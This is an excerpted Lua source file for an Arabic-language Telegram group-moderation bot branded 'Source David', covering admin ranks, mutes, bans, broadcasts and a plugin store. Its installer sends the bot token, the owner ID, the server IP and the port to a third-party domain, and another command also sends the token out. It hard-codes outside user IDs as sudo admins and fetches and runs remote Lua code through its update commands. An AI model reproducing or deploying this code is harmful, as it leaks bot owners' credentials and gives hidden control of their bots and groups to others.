...
data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=David&Info&Id="..Id)
if res == 200 then
...
https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::David::")
local RunDavid = io.open("David", 'w')
RunDavid:write([[
#!/usr/bin/env bash
cd $HOME/David
token="]]..database:get(Server.."Token_Write")..[["
...
os.execute('chmod +x David;sudo chmod +x ./WtN;./WtN')
end
Files_Info_Get()
end 
...
sudo_users = {SUDO,1558668590,1750071859}   
...
local hash = database:sismember(bot_id.."Dev:David:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevDavid(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevDavid(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevDavid(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevDavid(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevDavid(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevDavid(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevDavid(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif database:sismember(bot_id.."Dev:David:2", user_id) then
var = true  
...
if database:sismember(bot_id..'David:ProGroups',msg.chat_id_) then
var = true
else
...
local UserName = (data.username_ or "DavidTeaM")
...
local David_Msg = ''  
if msgs < 100 then 
David_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
David_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
David_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
David_Msg = 'متفاعل' 
elseif msgs < 1200 then 
David_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
David_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
David_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
David_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
David_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
David_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
David_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
David_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
David_Msg = 'رب التفاعل'  
end 
return David_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇Source David.")  
...
send(chat,msg.id_," ᥀︙هذا الملف غير تابع لسورس ديفد")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
...
--------------------------------------------------------------------------------------------------------------
function SourceDavid(msg,data) -- بداية العمل
if msg then
...
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
...
send(msg.chat_id_, msg.id_,David_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ᥀' and DevDavid(msg) then  
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'تعطيل التواصل ᥀' and DevDavid(msg) then  
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'ضع كليشه ستارت ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'حذف كليشه ستارت ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'معلومات السيرفر ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
os.execute('rm -rf David.lua')
os.execute('wget https://raw.githubusercontent.com/DavidTeam2/David/main/David.lua')
send(msg.chat_id_, msg.id_,'᥀︙تم تحديث السورس \n᥀︙لديك اخر اصدار لسورس ديفد\n᥀︙الاصدار » { v 2.6 }')
dofile('David.lua')  
end

if text == 'مطور السورس ᥀' and DevDavid(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'᥀︙اهلا بك عزيزي\n᥀︙ان كان لديك استفسار او اي مشكلة\n᥀︙يمكنك مراسلة مطور السورس\n᥀︙حساب مطور السورس [اضـغـط هـنـا  𓆩•𝐀𝐁𝐁𝐀𝐒 𝐅𝐀𝐃𝐇𝐈𝐋•𓆪  ](t.me/TSTTT)')
end

if text == 'تحديث المتجر ᥀' and DevDavid(msg) then 
io.popen("mkdir File_Bot")
os.execute("rm -fr File_Bot/*")
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/DavidTeam2/Files_David/main/File_Bot/all.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/DavidTeam2/Files_David/main/File_Bot/Reply.lua")  
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/DavidTeam2/Files_David/main/File_Bot/games.lua") 
send(msg.chat_id_, msg.id_,'᥀︙اهلا بك عزيزي\n᥀︙تم تنزيل جميع ملفات المتجر وتحديثه الى اخر اصدار\n᥀︙تابعنا لتصلك اخر التحديثات\n᥀︙[قناة السورس](t.me/L9L9L)')
dofile('David.lua')  
end
...
if text == 'المجموعات المدفوعه ᥀' and DevDavid(msg) then
local List = database:smembers(bot_id.."David:ProGroups")
local David = '᥀︙المجموعات المدفوعه \n᥀︙تاريخ اليوم '..os.date("%Y/%m/%d")..' \nٴ≪━━━━ David ━━━━≫ٴ\n'
for k,v in pairs(List) do
local Davidgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
if Davidgetlink.ok == true then 
link_David = '['..Davidgetlink.result..']'
else
link_David = 'ليست لدي صلاحية الدعوه لهذه المجموعه'
end
David = David..k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."David:ProGroups:Time"..v).."`) \n- "..link_David.." \n" 
end
if #List == 0 then
David = '᥀︙لاتوجد مجموعات مدفوعه'
end
send(msg.chat_id_, msg.id_,David) 
end
if text == 'جلب ملف السورس ᥀' then
if not DevDavid(msg) then
send(msg.chat_id_, msg.id_,'᥀︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './David.lua', '᥀︙نسخة ملف سورس ديفد')
end 
end
if (text == "تغير المطور الاساسي ᥀") and msg.reply_to_message_id_ == 0 and DevDavid(msg) then 
...
if text == ("مسح المحظورين عام ᥀") and DevDavid(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n᥀︙تم مسح المحظورين عام')
return false
end
if text == ("مسح المكتومين عام ᥀") and DevDavid(msg) then
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n᥀︙تم مسح قائمه المكتومين عام')
return false
end
if text == 'الاصـدار ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'᥀︙اصدار سورس ديفد \n᥀︙الاصدار »{ v 2.6 }')
end
if text == "ضع اسم للبوت ᥀" and DevDavid(msg) then  
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'الاحصائيات ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'المشتركين ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'الكروبات ᥀' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
local list = database:smembers(bot_id..'Dev:David:2')
t = "\n᥀︙قائمة الثانويين \nٴ≪━━━━ David ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
-------------
if text == "قناة التحديثات ᥀" and DevDavid(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس ديفد*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝚆𝙰𝚃𝙰𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/L9L9L"}},
}
...
-----------
if text == ("المحظورين عام ᥀") and DevDavid(msg) then
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == ("قائمه الكتم العام ᥀") and DevDavid(msg) then
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text=="اذاعه خاص ᥀" and msg.reply_to_message_id_ == 0 and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text=="اذاعه ᥀" and msg.reply_to_message_id_ == 0 and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text=="اذاعه بالتثبيت ᥀" and msg.reply_to_message_id_ == 0 and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text=="اذاعه بالتوجيه ᥀" and msg.reply_to_message_id_ == 0  and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text=="اذاعه بالتوجيه خاص ᥀" and msg.reply_to_message_id_ == 0  and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text == 'جلب نسخه الاحتياطيه ᥀' and DevDavid(msg) then 
GetFile_Bot(msg)
end
...
send(msg.chat_id_, msg.id_,'᥀︙عدد الكروبات الان » { '..#group..' }'..Davidk..''..David..'\n᥀︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevDavid(msg) then
...
usertext = '\n᥀︙العضو » ['..result.title_..'](t.me/'..(username or 'DavidTeaM')..')'
status  = '\n᥀︙تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevDavid(msg) then
...
usertext = '\n᥀︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DavidTeaM')..')'
status  = '\n᥀︙تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevDavid(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevDavid(msg) then
...
local David1_Msg = database:get(bot_id.."David1:Add:Filter:Rp2"..text..msg.chat_id_)   
if David1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'᥀︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'DavidTeaM')..') \n᥀︙'..David1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if msg.content_.text_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'David:ProGroups',v) then
send(v, 0,'['..msg.content_.text_..']')  
end
end
elseif msg.content_.photo_ then
...
--------------------------------------------------------------------------------------------------------------
if David_Msg and not Special(msg) then  
local David_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if David_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ᥀︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n᥀︙["..David_Msg.."] \n")
else
send(msg.chat_id_,0," ᥀︙العضو : {["..data.first_name_.."](t.me/L9L9L)}\n᥀︙["..David_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ᥀︙عذرا » {["..data.first_name_.."](t.me/L9L9L)}\n᥀︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevDavid(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevDavid(msg) then
...
if text == 'تحديث السورس' or text == 'تحديث سورس' and DevDavid(msg) then 
local url,res = https.request('https://ccccxcc.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_DavidTeaM ~= true then
send(msg.chat_id_,msg.id_,'᥀︙اهلا بك عزيزي ،\n᥀︙اشترك في قناة السورس\n᥀︙ثم ارسل الامر مره اخرى\n᥀︙قناة السورس @L9L9L')   
...
if text and text:match("^وضع قناة الاشتراك ᥀$") and DevDavid(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '᥀︙حسنآ ارسل لي معرف القناة')
return false  
end
...
database:set(bot_id.."AL:AddDavid:stats","✔")
end
...
local MRDavid = database:get(bot_id.."AL:AddDavid:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRDavid.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
end
...
database:sadd(bot_id.."David:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."David:blocname"..msg.chat_id_)
...
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
send(msg.chat_id_, msg.id_, '᥀︙تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
...
if t2.id_ then 
name_MRDavid = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRDavid then 
names_MRDavid = database:smembers(bot_id.."David:blocname"..msg.chat_id_) or ""
if names_MRDavid and names_MRDavid[1] then 
for i=1,#names_MRDavid do 
if name_MRDavid:match("(.*)("..names_MRDavid[i]..")(.*)") then 
...
database:set(bot_id.."David:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."David:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."David:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."David:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'᥀︙التوحيد '..s1..'\n᥀︙عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
send(msg.chat_id_, msg.id_, '᥀︙تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
send(msg.chat_id_, msg.id_, '᥀︙تم تعطيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."David:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function David_mrDavid_new(mrDavid1,mrDavid2)
if mrDavid2 and mrDavid2.first_name_ then 
if mrDavid2.first_name_:match("(.*)"..database:get(bot_id.."David:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."David:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrDavid_nnn = database:get(bot_id.."David:nump"..msg.chat_id_) or 5
local mrDavid_nnn2 = database:get(bot_id.."David:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrDavid_nnn2) == tonumber(mrDavid_nnn) or tonumber(mrDavid_nnn2) > tonumber(mrDavid_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."David:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "᥀︙عزيزي >>["..mrDavid2.username_.."](https://t.me/"..(mrDavid2.username_ or "DavidTeaM")..")\n᥀︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."David:teh"..msg.chat_id_).."} بجانب اسمك\n᥀︙عدد المحاولات المتبقيه {"..(tonumber(mrDavid_nnn) - tonumber(mrDavid_nnn2)).."}")
end
end
end
end
bnnaGet(id, David_mrDavid_new)
end
end
if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
send(msg.chat_id_, msg.id_, '᥀︙تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:WtN:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
...
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..DavidChengName..']')
...
if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
send(msg.chat_id_, msg.id_, '᥀︙تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
...
if data.id_ then 
if data.id_ ~= bot_id then
local DavidChengUserName = database:get(bot_id.."David:Cheng:UserName"..data.id_)
if not data.username_ then 
if DavidChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..DavidChengUserName..']')
database:del(bot_id.."David:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if DavidChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."David:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
send(msg.chat_id_, msg.id_, '᥀︙تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddDavid:stats") == "✔" then
...
Text = "[⦑ Welcome to Source ⦒](t.me/L9L9L)\n[᥀ ⦑ SOURCE David ⦒](t.me/L9L9L)\n᥀ Source version : 2.6"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/L9L9L"},
{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/X6UX6"}},
{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/L9L9L/7"}},
{{text = '𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓',url="t.me/TSTTT"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'رفع ملف السورس' or text == 'رفع الملف' and DevDavid(msg) then   
...
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './File_Bot/Reply.lua', '᥀︙ملف الردود الخاص بسورس ديفد')
end 
end
if text == 'رفع نسخه الاحتياطيه' and DevDavid(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'᥀︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'DavidTeaM')..') \n᥀︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'᥀︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'DavidTeaM')..') \n᥀︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevDavid(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevDavid(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevDavid(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevDavid(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevDavid(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if DevDavid(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/DavidTeam2/Files_David/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n᥀︙اهلا بك في متجر ملفات ديفد\n᥀︙ملفات السورس ↓\nٴ≪━━━━ David ━━━━≫ٴ\n\n"
local TextE = "\nٴ≪━━━━ David ━━━━≫ٴ\n᥀︙علامة تعني { ✔️ } ملف مفعل\n᥀︙علامة تعني { ✖ } ملف معطل\n᥀︙قناة سورس ديفد ↓\n".." ᥀︙[اضغط هنا لدخول](t.me/L9L9L) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/DavidTeam2/Files_David/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('David.lua')  
else
send(msg.chat_id_, msg.id_," ᥀︙عذرا الملف لايدعم سورس ديفد \n") 
end
return false
end
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevDavid(msg) then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevDavid(msg) then
...
if text == "مسح الملفات" and DevDavid(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ᥀︙تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevDavid(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevDavid(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
HttpsMsg = https.request('https://api-David.ml/abahi/abahi.php?Get=David&TokenBot='..token..'&Url='..UrlId)
...
if database:get(bot_id..'DRAGOON:change:David'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:David'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:David'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:David'..msg.chat_id_,true)  
Text = '\n᥀︙تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:David'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "abos-David")
...
database:sadd(bot_id.."Dev:David:2", result.sender_user_id_)
...
database:sadd(bot_id.."Dev:David:2", result.id_)
...
database:sadd(bot_id.."Dev:David:2", userid)
...
function Function_David(extra, result, success)
database:srem(bot_id.."Dev:David:2", result.sender_user_id_)
...
function Function_David(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:David:2", result.id_)
...
database:srem(bot_id.."Dev:David:2", userid)
...
database:del(bot_id.."Dev:David:2")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n᥀︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DavidTeaM')..')'
status  = '\n᥀︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n᥀︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
